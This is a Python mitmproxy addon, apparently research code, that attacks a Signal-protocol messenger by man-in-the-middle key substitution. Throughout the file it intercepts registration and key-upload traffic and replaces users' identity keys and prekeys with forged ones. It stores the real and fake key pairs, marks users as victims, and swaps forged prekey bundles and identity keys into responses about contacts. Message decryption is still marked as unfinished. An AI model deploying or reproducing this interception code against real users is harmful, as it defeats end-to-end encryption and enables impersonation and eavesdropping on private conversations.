# from mitmproxy.http import HTTPFlow
# from mitmproxy import ctx
from dataclasses import dataclass
from typing import Optional
import logging
from mitmproxy.http import Request, Response, HTTPFlow
from xepor import RouteType, HTTPVerb, Router
import json
# from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
from signal_protocol import helpers
from base64 import b64decode, b64encode
from database import User, Device, LegitBundle, MitMBundle
from enum import Enum
import re
import parse

from protos.gen.wire_pb2 import *
# from protos.gen.SignalService_pb2 import *
# from protos.gen.storage_pb2 import *
from protos.gen.WebSocketResources_pb2 import *
# from protos.gen.SignalService_pb2 import *
# from protos.gen.sealed_sender_pb2 import *
# from protos.gen import *

# from server_proto import *
from server_proto import addons, HOST_HTTPBIN
from mitm_interface import *
from collections import defaultdict

registration_info = dict()
conversation_session = dict()
bobs_bundle = dict()


class CiphertextMessageType(Enum):
    WHISPER = 2
    PRE_KEY_BUNDLE = 3
    SENDER_KEY_DISTRIBUTION = 7
    PLAINTEXT = 8


@dataclass
class PendingWebSocket:
    request: WebSocketRequestMessage = None
    response: WebSocketResponseMessage = None


websocket_open_state = defaultdict(PendingWebSocket)


@dataclass
class KeyData:
    IdenKey: Optional[identity_key.IdentityKeyPair] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[dict] = None
    pq_PreKeys: Optional[dict] = None

    fake_IdenKey: Optional[identity_key.IdentityKeyPair] = None
    fake_SignedPreKeys: Optional[dict] = None
    fake_secret_SignedPreKeys: Optional[dict] = None

    fake_PreKeys: Optional[dict] = None
    fake_secret_PreKeys: Optional[dict] = None

    fake_pq_PreKeys: Optional[dict] = None
    fake_secret_pq_PreKeys: Optional[dict] = None

    fake_lastResortKey: Optional[dict] = None
    fake_secret_lastResortKey: Optional[dict] = None


@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None

    aciData: Optional[KeyData] = None
    pniData: Optional[KeyData] = None


@dataclass
class BobIdenKey:
    uuid: str
    identityKey: Optional[identity_key.IdentityKeyPair] = None
    fake_identityKey: Optional[identity_key.IdentityKeyPair] = None


api = addons[0]


@api.route("/v1/registration", rtype=RouteType.REQUEST)
def _v1_registration(flow: HTTPFlow):
    # logging.info(f"ADDRESS {flow.client_conn.address[0]}")

    req = json.loads(flow.request.content)
    # logging.info(json.dumps(req, indent=4))

    unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']

    aci_IdenKey = req['aciIdentityKey']
    pni_IdenKey = req['pniIdentityKey']

    aci_SignedPreKey = req['aciSignedPreKey']
    pni_SignedPreKey = req['pniSignedPreKey']

    aci_pq_lastResortKey = req['aciPqLastResortPreKey']
    pni_pq_lastResortKey = req['pniPqLastResortPreKey']

    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()

    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey)

    req.update(fake_signed_pre_keys)

    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
        unidentifiedAccessKey=unidentifiedAccessKey,
        aciData=KeyData(
            IdenKey=aci_IdenKey,
            SignedPreKey=aci_SignedPreKey,
            pq_lastResortKey=aci_pq_lastResortKey,
            fake_IdenKey=aci_fake_IdenKey,
            fake_SignedPreKeys=fake_signed_pre_keys["aciSignedPreKey"],
            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
            # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
            fake_lastResortKey=fake_signed_pre_keys["aciPqLastResortPreKey"],
            fake_secret_lastResortKey=fake_secret_SignedPreKeys["aciPqLastResortSecret"]
        ),
        pniData=KeyData(
            IdenKey=pni_IdenKey,
            SignedPreKey=pni_SignedPreKey,
            pq_lastResortKey=pni_pq_lastResortKey,
            fake_IdenKey=pni_fake_IdenKey,
            fake_SignedPreKeys=fake_signed_pre_keys["pniSignedPreKey"],
            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
            # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
            # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
            # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
            fake_lastResortKey=fake_signed_pre_keys["pniPqLastResortPreKey"],
            fake_secret_lastResortKey=fake_secret_SignedPreKeys["pniPqLastResortSecret"]
        )

    )

    flow.request.content = json.dumps(req).encode()


@api.route("/v1/registration", rtype=RouteType.RESPONSE)
def _v1_registration(flow: HTTPFlow):
    resp = json.loads(flow.response.content)
    # logging.info(f"RESPONSE: {resp}")
    ip_address = flow.client_conn.peername[0]

    user = User.insert(
        pNumber=resp["number"],
        aci=resp["uuid"],
        pni=resp["pni"],
        isVictim=True
    )

    device = Device.insert(
        aci=resp["uuid"],
        pni=resp["pni"],
        deviceId=1,
        aciIdenKey=registration_info[ip_address].aciData.IdenKey,
        pniIdenKey=registration_info[ip_address].pniData.IdenKey,
        unidentifiedAccessKey=registration_info[ip_address].unidentifiedAccessKey,
    )

    user.on_conflict_replace().execute()
    device.on_conflict_replace().execute()

    registration_info[ip_address].aci = resp["uuid"]
    registration_info[ip_address].pni = resp["pni"]


@api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
def _v2_keys(flow: HTTPFlow):
    identity = flow.request.query["identity"]

    req = json.loads(flow.request.content)
    ip_addr = flow.client_conn.peername[0]

    # TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
    if not registration_info.get(ip_addr):
        logging.error(f"Address {ip_addr} not found in registration_info. {registration_info}")

    key_data = registration_info[ip_addr].aciData if identity == "aci" else registration_info[ip_addr].pniData

    try:
        alice_identity_key_pair = key_data.fake_IdenKey
    except KeyError:
        logging.exception(f"{flow} AND {registration_info}")
        return

    pq_pre_keys = req["pqPreKeys"]
    pre_keys = req["preKeys"]

    key_data.pq_PreKeys = pq_pre_keys
    key_data.PreKeys = pre_keys

    fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair)

    req.update(fake_pre_keys)

    key_data.fake_PreKeys = fake_pre_keys["preKeys"]
    key_data.fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
    key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
    key_data.fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]

    legit_bundle = LegitBundle.insert(
        type=identity,
        aci=registration_info[ip_addr].aci,
        deviceId=1,  # todo: shouldnt be static
        IdenKey=key_data.IdenKey,
        SignedPreKey=key_data.SignedPreKey,
        PreKeys=key_data.PreKeys,
        kyberKeys=key_data.pq_PreKeys,
        lastResortKyber=key_data.pq_lastResortKey
    )

    mitm_bundle = MitMBundle.insert(
        type=identity,
        aci=registration_info[ip_addr].aci,
        deviceId=1,  # todo: shouldnt be static
        FakeIdenKey=(b64encode(key_data.fake_IdenKey.public_key().serialize()).decode("utf-8"),
                     b64encode(key_data.fake_IdenKey.private_key().serialize()).decode("utf-8")),
        FakeSignedPreKey=(key_data.fake_SignedPreKeys, key_data.fake_secret_SignedPreKeys),
        FakePrekeys=(key_data.fake_PreKeys, key_data.fake_secret_PreKeys),
        fakeKyberKeys=(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys),
        fakeLastResortKyber=(key_data.fake_lastResortKey, key_data.fake_secret_lastResortKey)
    )

    legit_bundle.on_conflict_replace().execute()
    mitm_bundle.on_conflict_replace().execute()

    flow.request.content = json.dumps(req).encode()


@api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
    # logging.exception((flow.response.content, identifier, device_id))

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
    identity, uuid = identifier.split(":")

    bob_identity_key_public = b64decode(resp["identityKey"])

    ############ MitmToBob setup (fake Alice)
    fake_victims = {}
    for _id, bundle in enumerate(resp["devices"]):
        # data should be uuid of Alice and the device id (in this case 1 is ok)
        fakeVictim = MitmUser(address.ProtocolAddress("1", 1))
        fake_victims[_id] = fakeVictim
        bob_registartion_id = bundle["registrationId"]

        bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
        bob_kyber_pre_key_signature = b64decode(bundle["pqPreKey"]["signature"] + "==")
        bob_kyber_pre_key_id = bundle["pqPreKey"]["keyId"]

        bob_signed_pre_key_public = b64decode(bundle["signedPreKey"]["publicKey"])
        bob_pre_key_public = b64decode(bundle["preKey"]["publicKey"])

        device_id = bundle["deviceId"]

        bob_bundle = state.PreKeyBundle(
            bob_registartion_id,
            address.DeviceId(_id),
            (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
            state.SignedPreKeyId(1),
            PublicKey.deserialize(bob_signed_pre_key_public),
            b64decode(bundle["signedPreKey"]["signature"] + "=="),
            IdentityKey(bob_identity_key_public),
        )

        bob_bundle = bob_bundle.with_kyber_pre_key(state.KyberPreKeyId(bob_kyber_pre_key_id),
                                                   kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                                                   bob_kyber_pre_key_signature)

        legit_bundle = LegitBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            IdenKey=b64encode(bob_identity_key_public).decode("ascii"),
            SignedPreKey=b64encode(bob_signed_pre_key_public).decode("ascii"),
            PreKeys=b64encode(bob_pre_key_public).decode("ascii"),
            kyberKeys=b64encode(bob_kyber_pre_key_public).decode("ascii"),
            lastResortKyber=b64encode(bob_kyber_pre_key_public).decode("ascii")
        )
        legit_bundle.on_conflict_replace().execute()
        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, _id), bob_bundle)

    # TODO: Swap the prekeybundle

    mitm_bundles = {}

    for _id, bundle in enumerate(resp["devices"]):
        # This should impersonate Bob's info 
        # identity_key = MitMBundle.select().where(MitMBundle.type == identity,
        #                                             MitMBundle.aci == uuid,
        #                                             MitMBundle.deviceId == device_id).first()

        identity_key = bobs_bundle.get(uuid)

        if not identity_key:
            # TODO: create row
            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id))
            # identity_key = fakeUser.pre_key_bundle.identity_key()
            identity_key = fakeUser.identity_key_pair

        else:
            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, _id), identity_key=identity_key.fake_identityKey)
            identity_key = identity_key.fake_identityKey

        fakeBundle = fakeUser.pre_key_bundle.to_dict()

        logging.info(f"FAKE BUNDLE: {json.dumps(fakeBundle, indent=4)}")

        fakeBundle_wire = {
            "identityKey": identity_key.public_key().to_base64(),
            "devices": [
                {
                    "devicedId": 1,
                    "registrationId": fakeBundle["registration_id"],
                    "preKey": {
                        "keyId": fakeBundle["pre_key_id"],
                        "publicKey": fakeBundle["pre_key_public"]
                    },
                    "signedPreKey": {
                        "keyId": fakeBundle["signed_pre_key_id"],
                        "publicKey": fakeBundle["signed_pre_key_public"],
                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  #
                    },
                    "pqPreKey": {
                        "keyId": fakeBundle["kyber_pre_key_id"],
                        "publicKey": fakeBundle["kyber_pre_key_public"],
                        "signature": fakeBundle["kyber_pre_key_sign"][:-2]  # todo: fix this
                    }
                }
            ]
        }

        mitm_bundle = MitMBundle.insert(
            type=identity.lower(),
            aci=uuid,
            deviceId=device_id,
            FakeIdenKey=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
            FakeSignedPreKey=(fakeBundle_wire["devices"][0]["signedPreKey"],
                              fakeUser.signed_pre_key_pair.private_key().to_base64()),
            FakePrekeys=(fakeBundle_wire["devices"][0]["preKey"],
                         fakeUser.pre_key_pair.private_key().to_base64()),
            fakeKyberKeys=(fakeBundle_wire["devices"][0]["pqPreKey"],
                           fakeUser.kyber_pre_key_pair.get_private().to_base64()),
            fakeLastResortKyber=(fakeUser.last_resort_kyber.get_public().to_base64(),
                                 fakeUser.last_resort_kyber.get_private().to_base64())
        )
        mitm_bundle.on_conflict_replace().execute()
        mitm_bundles[_id] = mitm_bundle, fakeBundle_wire, fakeUser, fake_victims[_id]

    keys = list(mitm_bundles.keys())
    if len(keys) < 1:
        logging.info(f"wtf bob: {resp['devices']}")

    _, fakeBundle_wire, fakeUser, fakeVictim = mitm_bundles[keys[0]]
    resp.update(fakeBundle_wire)
    conversation_session[(ip_address, identifier)] = (fakeUser, fakeVictim)
    flow.response.content = json.dumps(resp, sort_keys=True).encode()


@api.ws_route("/v1/websocket/")
def _v1_websocket(flow, msg):
    # logging.info(f"WEBSOCKET: {msg}")
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id, path = ws_msg.id, ws_msg.path
    if websocket_open_state.get(_id):
        logging.warning(f"Message already exists with id {_id}")
    websocket_open_state[_id].request = ws_msg

    logging.warning(f"Websocket req with id {_id} and path {path}")


def _v1_ws_my_profile(flow, identifier, version, credential_request):
    logging.info(f"my profile: {identifier} {version} {credential_request}")

    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()
    return flow.response.content


def _v1_ws_profile_futut(flow, identifier, version):
    logging.info(f"my profile 2: {identifier} {version}")
    resp = json.loads(flow.response.content)
    ip_address = flow.client_conn.address[0]

    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")

    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
    flow.response.content = json.dumps(resp).encode()
    return flow.response.content


def _v1_ws_profile(flow, identifier):
    logging.info(f"{identifier}")
    try:
        uuid_type, uuid = re.search(r"(PNI|ACI):([a-f0-9-]+)", identifier).groups()
    except AttributeError:
        logging.exception(f"Invalid identifier {identifier}")
        return
    content = json.loads(flow.response.content)

    logging.info(f"PROFILE: {content}")

    iden_key = content["identityKey"]

    bundle = MitMBundle.select().where(MitMBundle.type == uuid_type, MitMBundle.aci == uuid).first()

    if bundle:
        public_fake_IdenKey = bundle.FakeIdenKey[0]
    else:
        fake_IdenKey = identity_key.IdentityKeyPair.generate()
        bobs_bundle[uuid] = BobIdenKey(uuid, iden_key, fake_IdenKey)
        public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")

    logging.info(f"BUNDLE: {bundle}")
    content["identityKey"] = public_fake_IdenKey

    logging.info(f"content: {content}")  # TODO: what's happening here? No injection of fake identity key

    # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
    # ideally, we will propage this further by checking if the flow was altered by the handler auto-magically.
    flow.response.content = json.dumps(content).encode()
    return flow.response.content


def _v2_ws_message(flow, identifier):
    logging.info(f"message: {identifier}")
    logging.info(f"message: {flow.request.content}")

    resp = json.loads(flow.request.content)
    ip_address = flow.client_conn.address[0]

    logging.info(f"ws message content: {resp}")

    destintion_user = resp["destination"]
    for msg in resp["messages"]:
        if msg["destinationDeviceId"] != 1:
            logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")

        msg_type = CiphertextMessageType(int(msg["type"]))
        logging.warning(f"MESSAGE TYPE: {msg_type}")

        if msg_type != CiphertextMessageType.PRE_KEY_BUNDLE:
            logging.error("Only PREKEY_BUNDLE is supported at the moment. C.f. my Twint ;)")
            continue

        content = b64decode(msg["content"])[1:]

        ctxt = PreKeySignalMessage()
        ctxt.ParseFromString(content)
        logging.warning(f"ctxt from IK: {b64encode(ctxt.identity_key)}")
        logging.info(f"ctxt from IK: {ctxt}")
        # TODO: unproduf / decrypt / alter / encrypt / prodobuf 

    # msg_type = CiphertextMessageType(int(resp["type"]))
    # logging.warning(f"MESSAGE TYPE: {msg_type}")

    # logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")


def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request if rtype == RouteType.REQUEST else ws_msg.response

    pseudo_flow = HTTPFlow(client_conn=orig_flow.client_conn, server_conn=orig_flow.server_conn)
    from mitmproxy.http import Headers

    if rtype == RouteType.REQUEST:
        # todo: handle headers
        pseudo_flow.request = Request(host=orig_flow.request.host, port=orig_flow.request.port,
                                      scheme=orig_flow.request.scheme.encode(),
                                      method=ws_msg.verb.upper().encode(),
                                      authority=orig_flow.request.authority.encode(),
                                      http_version=orig_flow.request.http_version.encode(),
                                      trailers=None, timestamp_start=orig_flow.request.timestamp_start,
                                      timestamp_end=orig_flow.request.timestamp_end,
                                      path=ws_msg.path.encode(), headers=Headers(), content=ws_msg.body)
    else:
        # todo: handle headers + reason
        rp = Response(http_version=orig_flow.response.http_version.encode(), status_code=ws_msg.status, reason=b"id: ",
                      headers=Headers(), content=ws_msg.body, trailers=None,
                      timestamp_start=orig_flow.response.timestamp_start,
                      timestamp_end=orig_flow.response.timestamp_end)
        pseudo_flow.response = rp
    return pseudo_flow


ws_resp = Router()

ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                  _v1_ws_my_profile, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)

ws_req = Router()
ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message, None)

logging.warning(f"ROUTES (REQ): {ws_req.routes}")
logging.warning(f"ROUTES (RESP): {ws_resp.routes}")


@api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
def _v1_websocket_req(flow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.request
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id = ws_msg.id
    if websocket_open_state.get(_id):
        logging.warning(f"Message request already exists for id {_id}")
        # return
    websocket_open_state[_id] = PendingWebSocket()
    websocket_open_state[ws_msg.id].request = ws_msg
    path = websocket_open_state[_id].request.path

    flow_decap = decap_ws_msg(flow, msg)
    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
    handler, params, _ = ws_req.find_handler(HOST_HTTPBIN, path)
    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
    if handler:
        req = handler(flow_decap, *params.fixed, **params.named)
        if req:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.request.body = req
            msg.content = new_ws.SerializeToString()


@api.ws_route("/v1/websocket/", rtype=RouteType.RESPONSE)
def _v1_websocket_resp(flow, msg):
    ws_msg = WebSocketMessage()
    ws_msg.ParseFromString(msg.content)
    ws_msg = ws_msg.response
    logging.info(f"WEBSOCKET: {ws_msg}")

    _id = ws_msg.id

    if not websocket_open_state.get(_id):
        logging.warning(f"Message request does not exist for id {_id}")
        return
    # websocket_open_state[ws_msg.id].request = ws_msg
    path = websocket_open_state[_id].request.path

    websocket_open_state[_id].response = ws_msg
    logging.warning(f"Websocket resp with id {_id} and path {path}")

    unwrapped_flow = decap_ws_msg(flow, msg, RouteType.RESPONSE)
    # todo: HARDCODING IS BAD - but replays only have IPS not hosts
    handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path)
    logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
    if handler:
        resp = handler(unwrapped_flow, *params.fixed, **params.named)
        if resp:
            # msg. = resp
            new_ws = WebSocketMessage()
            new_ws.ParseFromString(msg.content)
            new_ws.response.body = resp
            msg.content = new_ws.SerializeToString()


addons = [api]
